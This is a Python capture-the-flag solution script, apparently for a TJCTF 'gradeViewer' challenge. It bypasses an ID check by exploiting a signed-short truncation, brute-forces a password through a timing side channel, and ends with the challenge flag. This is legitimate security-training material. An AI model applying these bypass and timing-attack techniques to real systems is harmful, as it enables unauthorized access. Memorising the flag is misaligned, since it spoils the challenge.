# 0x0BEE in decimal
target = 0x0BEE
print(f'Target value (0x0BEE): {target}')

# The issue: validation checks id > 10, so we need id <= 10
# But when cast to short, it should become 0x0BEE (3054)
# 
# Since short is 16-bit signed (-32768 to 32767), and we need 0x0BEE (3054)
# We can use a negative number that when cast to short gives us 3054
# 
# In two's complement, we can use: target - 65536 = 3054 - 65536 = -62482
# When this negative number is cast to short, it wraps around to 3054

exploit_value = target - 65536  # This gives us a negative number
print(f'Exploit value: {exploit_value}')
print(f'Hex: 0x{exploit_value & 0xFFFFFFFF:x}')  # Show as unsigned hex

# Verify: simulate the cast
import ctypes
result = ctypes.c_short(exploit_value).value
print(f'When cast to short: {result} (0x{result & 0xFFFF:x})')
print(f'Passes id > 10 check: {exploit_value <= 10}')

# Now let's implement the timing attack for the password
import time
import subprocess
import string

def timing_attack():
    # The password consists of [a-z, 0-9] characters
    charset = string.ascii_lowercase + string.digits
    password = ""
    
    print("\nStarting timing attack...")
    
    # We'll try each position of the password
    for pos in range(20):  # Assume max password length of 20
        best_char = None
        max_time = 0
        
        print(f"Finding character at position {pos + 1}...")
        
        for char in charset:
            test_password = password + char
            
            # Run the program multiple times to get average timing
            times = []
            for _ in range(3):  # Test each character 3 times
                start_time = time.time()
                
                proc = subprocess.Popen(['./gradeViewer'], 
                                      stdin=subprocess.PIPE, 
                                      stdout=subprocess.PIPE, 
                                      stderr=subprocess.PIPE,
                                      text=True)
                
                # Send the exploit value to trigger teacher auth
                output, _ = proc.communicate(input=f"{exploit_value}\n{test_password}\n")
                
                elapsed = time.time() - start_time
                times.append(elapsed)
            
            avg_time = sum(times) / len(times)
            print(f"  {char}: {avg_time:.4f}s")
            
            if avg_time > max_time:
                max_time = avg_time
                best_char = char
        
        if best_char is None:
            print("No improvement found, password might be complete")
            break
            
        password += best_char
        print(f"Current password: {password}")
        
        # Test if this is the complete password
        proc = subprocess.Popen(['./gradeViewer'], 
                              stdin=subprocess.PIPE, 
                              stdout=subprocess.PIPE, 
                              stderr=subprocess.PIPE,
                              text=True)
        
        output, _ = proc.communicate(input=f"{exploit_value}\n{password}\n")
        
        if "Access granted" in output:
            print(f"\nüéâ Password found: {password}")
            print("Flag should be displayed!")
            print(output)
            return password
    
    return password

if __name__ == "__main__":
    print("=== Grade Viewer Exploit ===")
    print(f"Using exploit value: {exploit_value}")
    
    # First, let's test if our exploit value works
    proc = subprocess.Popen(['./gradeViewer'], 
                          stdin=subprocess.PIPE, 
                          stdout=subprocess.PIPE, 
                          stderr=subprocess.PIPE,
                          text=True)
    
    output, _ = proc.communicate(input=f"{exploit_value}\ntest\n")
    print("Test output:")
    print(output)
    
    if "Enter your password" in output:
        print("‚úÖ Exploit value works! Proceeding with timing attack...")
        timing_attack()
    else:
        print("‚ùå Exploit value didn't work as expected")

# tjctf{th4nk_y0u_f0r_sav1ng_m3y_grade}